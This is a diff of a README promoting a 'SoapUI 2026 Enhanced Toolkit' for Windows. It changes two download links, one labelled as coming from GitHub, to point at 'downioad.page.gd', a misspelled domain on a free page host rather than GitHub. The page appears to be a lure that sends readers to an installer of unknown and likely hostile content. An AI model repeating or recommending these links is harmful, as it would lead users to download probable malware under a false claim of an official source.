@@ -2,7 +2,7 @@
 
 Discover the SoapUI 2026 Enhanced Toolkit, a comprehensive package designed to supercharge your API testing and automation workflows on Windows. This toolkit includes a suite of plugins and tools to streamline your development process, making it easier to test RESTful and SOAP services efficiently.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -66,7 +66,7 @@ Updates can be downloaded from the same page where you got the initial installer
 
 Get the latest version of the SoapUI 2026 Enhanced Toolkit from the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Changelog
 
